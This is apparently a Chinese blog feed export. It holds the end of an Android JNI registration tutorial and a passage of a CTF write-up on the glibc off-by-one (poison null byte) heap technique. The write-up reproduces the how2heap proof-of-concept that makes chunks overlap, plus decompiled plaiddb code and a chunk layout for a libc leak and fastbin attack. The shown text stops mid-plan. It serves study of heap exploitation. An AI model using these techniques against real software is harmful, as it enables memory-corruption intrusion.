class="string">&quot;com/example/jinstudy/MainActivity&quot;</span>);</span><br><span class="line">	<span class="comment">//2.获取静态字段ID</span></span><br><span class="line">	jfieldID  _jfieldID= (*env)-&gt;GetStaticFieldID(env, _jclass, <span class="string">&quot;ZD1&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">	<span class="comment">//3.获取静态字段</span></span><br><span class="line">	<span class="comment">//GetStaticObjectField:第一个env，第二个是类,既FindClass的返回值，第三个参数GetStaticFieldID的返回值</span></span><br><span class="line">	jobject  str= (*env)-&gt;GetStaticObjectField(env, _jclass, _jfieldID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是：</strong></p>
<ol>
<li><p>通常在我们编写native函数时，此类函数都会自带两个参数，分别为<em>JNIEnv *<em>和</em>jobject</em>，紧接着才是该函数在Java层中声明的参数列表。</p>
</li>
<li><p>我们通常需要返回一个<em>jobject</em>类型的对象，这就需要用到<strong>GetStaticObjectField</strong>方法，其参数分别是<em>JNIEnv*</em>,<em>jclass,jfiledID</em>。这里的JNIEnv<em>以及本节中后文的JNIEnv</em>均和native函数传入的第一个参数是一样的。</p>
</li>
<li><p>jfiledID对象将Java层的字段类型映射到C中，其需要通过<strong>GetStaticFieldID</strong>方法获取，而此方法的参数为<em>JNIEnv*</em>,<em>jclass,string,string</em>。<em>string</em>类型的第一个参数需要传入的是字段在Java层中的名称，第二个参数则是该参数的完整类型名称并以’;’结尾。</p>
</li>
<li><p>jclass则需要使用<strong>FindClass</strong>方法获取，其参数为<em>JNIEnv*<em>，</em>string</em>。<em>string</em>类型参数需要传入的是函数所在类的路径名，可以理解成将’.’替换成’/‘的包名+类名。</p>
</li>
<li><p>其实静态注册的代码编写的要点就是，需要的获取什么样的类型，就在jni.h中寻找能返回该类型的对应方法，再补全此方法的参数。本质是一个递归补全参数的过程😂。</p>
</li>
</ol>
<h2 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h2><p>通过 RegisterNatives函数由编程者完成 native函数与so中函数的绑定，使得程序可以通过这个映射表找到相应的函数了。</p>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp:"></a>Exp:</h3><p>在Java code中声明如下加减乘除函数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">sub</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">mul</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">div</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br></pre></td></tr></table></figure>

<p>引入jni.h后直接编写对应的.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="function">jdouble <span class="title">addc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">jdouble <span class="title">subc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a-b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">jdouble <span class="title">mulc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">jdouble <span class="title">divc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a/b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明native方法结构体</span></span><br><span class="line">JNINativeMethod nm[]=&#123;</span><br><span class="line">		<span class="comment">//参数：需绑定的java层函数名,参数返回值类型,需绑定的native函数指针</span></span><br><span class="line">		&#123;<span class="string">&quot;add&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)addc&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;sub&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)subc&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;mul&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)mulc&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;div&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)divc&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态注册</span></span><br><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span>&#123;</span><br><span class="line">	JNIEnv* env;</span><br><span class="line">	<span class="keyword">if</span>( (*vm)-&gt;GetEnv(vm, (<span class="keyword">void</span>**)&amp;env, JNI_VERSION_1_4)!=JNI_OK)&#123;</span><br><span class="line">	 <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">	&#125;</span><br><span class="line">	jclass jc = (*env)-&gt;FindClass(env,<span class="string">&quot;com/example/calcu/MainActivity&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>((*env)-&gt;RegisterNatives(env, jc, nm,<span class="keyword">sizeof</span>(nm)/<span class="keyword">sizeof</span>(nm[<span class="number">0</span>]))!=JNI_OK)&#123;</span><br><span class="line">		<span class="keyword">return</span> JNI_ERR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//固定返回值</span></span><br><span class="line">	<span class="keyword">return</span> JNI_VERSION_1_4;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>需要注意：</strong></p>
<ol>
<li><p>编写函数体的过程和静态注册差异不大</p>
</li>
<li><p>由于没有生成.h文件对函数进行声明，因此我们需要将所有函数整合为一个<em>JNINativeMethod</em>类型的结构体。其属性分别为函数再Java层中的字段名(string)，参数和返回值类型(string)，其中参数写在括号内，返回值写在括号外，最后一个参数是Native方法的函数指针(void *)。</p>
</li>
<li><p>对上述结构体用RegisterNatives方法进行注册，补全相应的参数后，写入<strong>JNI_OnLoad</strong>函数体中，该函数是动态注册是Native方法的入口。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>AndroidRe</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Off_By_One (plaiddb)</title>
    <url>/2020/03/16/Off_By_One/</url>
    <content><![CDATA[<p>​        plaiddb快把我肝崩溃了。。<span id="more"></span></p>
<h2 id="0x00-Off-By-One"><a href="#0x00-Off-By-One" class="headerlink" title="0x00 . Off_By_One"></a>0x00 . Off_By_One</h2><p>​        这个知识点在how2heap里是叫poison_null_byte，结果我上ctf-wiki找writeup的时候没找着，原来人家也叫off_by_one。下面先分析代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Tested in Ubuntu 14.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​        代码一开始还没看懂来着，看着它把b一分为二一头雾水不知道干啥，后来看了下刘老板的blog才理解的。</p>
<p>​        其大致的意思就是：系统的边界检查不严谨，当chunk填充大小为malloc_size时，整个chunk被字符串填满，而字符串还需要有’\x00’字符结尾，也就将下一个chunk的size的第一个字节修改了，有可能只改了in_use位(0x101 –&gt; 0x100)，有可能size和in_use位都改了(0x111 –&gt; 0x100)，这要看具体的chunk_size和利用过程。</p>
<p>​        参考如下示意图（没想到画个图要那么久。。）：</p>
<p>​        1.a = malloc(0x100)        b = malloc(0x200)        c = malloc(0x100)        barrier = malloc(0x100)最后这个chunk是用来隔开top chunk，否则当c释放时，top chunk会将其合并。</p>
<p>​        2.接着用a的溢出将b_size修改成0x200，并同时在b+0x200的地方写入0x200用作fake_pre_size用来通过检查。然后释放b。系统就会将b到b+0x200的空间释放，而非释放整个b chunk。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 25%;" />



<p>​        3.现在b的可控大小为0x200，存于unsort bin，现在将其进行分割。b1 = malloc(0x100)，b2 = malloc(0x80)。b1用来进行unlink合并，b2用来overlap。</p>
<p>​        4.释放b1，释放c，系统会根据c的pre_size找到b1的size，发现in_use == 0，于是将其合并。如此一来，b1到c都变成了一个chunk被收到unsort bin中。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 25%;" />

<p>​        5.d = malloc(0x400)，可以使得d的一部分与b2发生overlap。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:30%;" />

<p>​        6.overlap之后可以进行很多攻击。例如先free(d)，再malloc出d到b2中间的部分，此时b2到barrier的剩余空间仍作为一个孤零零的chunk呆在unsort bin，所以其fd，bk都指向main arena，再用可控的chunk b2就可以leak。</p>
<h2 id="0x01-plaiddb"><a href="#0x01-plaiddb" class="headerlink" title="0x01 . plaiddb"></a>0x01 . plaiddb</h2><p>​        天知道我查了多少个writeup，能基本看懂的也只有ctf-wiki的。。。。（CTF-Wiki🐂🍺！！）</p>
<h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        64位，文件保护全开。。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<p>​    主要的数据结构如下（参考参考CTF-Wiki，我只分析出前三个。。）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span>    </span><br><span class="line">    <span class="keyword">char</span> *key;    </span><br><span class="line">    <span class="keyword">long</span> data_size;   </span><br><span class="line">    <span class="keyword">char</span> *data;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span>    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span>    </span><br><span class="line">    <span class="keyword">long</span> what_1;    </span><br><span class="line">    <span class="keyword">long</span> what_2; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    怪不得一大片乱糟糟的指针操作，原来是树结构。那还分析个🔨。</p>
<p>​    不过看了看writeup好像这题利用跟树结构没啥关系。</p>
<p>​    主要函数有：GET(show_single)，PUT(add)，DUMP(show_all)，DEL(delete)，read_in。</p>
<p>​    漏洞在read_in函数里，可以溢出一个空字节。而且此处用到的是realloc()函数，申请的内存大小是可用大小逐次乘2所得的结果，所以说需要特定大小的chunk才能进行溢出。(0x18,0x38,0x78,0xf8,0x1f8)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = <span class="built_in">malloc_usable_size</span>(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(stdin);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">sub_1020</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);				<span class="comment">//realloc require a special size of chunk</span></span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Out of memory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = <span class="built_in">malloc_usable_size</span>(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;								<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        先来跑一遍程序看看：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<p>​        根据以下heap结构以及ida的静态分析可以看出，每执行一次PUT，系统会分配三个连续的chunk。a.row 结构体(0x40)    b.row key(0x20)    c.row data(size)。结构体中存有指向key和data的指针。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<h3 id="B-Memory-Arrangement"><a href="#B-Memory-Arrangement" class="headerlink" title="B. Memory Arrangement"></a>B. Memory Arrangement</h3><p>​        1.malloc出需要的chunk</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);	<span class="comment">//unsort chunk,</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">0x50</span>);	<span class="comment">//overlap chunk，leak libc_base</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x68</span>);	<span class="comment">//修改其fd，用于fast attack</span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);	<span class="comment">//溢出chunk，修改下一chunk的pre_size和in_use字节（用到了off_by_one漏洞）</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);	<span class="comment">//victim chunk，被溢出chunk</span></span><br><span class="line">barrier = <span class="built_in">malloc</span>(<span class="number">0x400</span>)	<span class="comment">//确保以上chunk不被top chunk合并。</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" />

<p>​        2.把a，c，d三个chunk释放。</p>
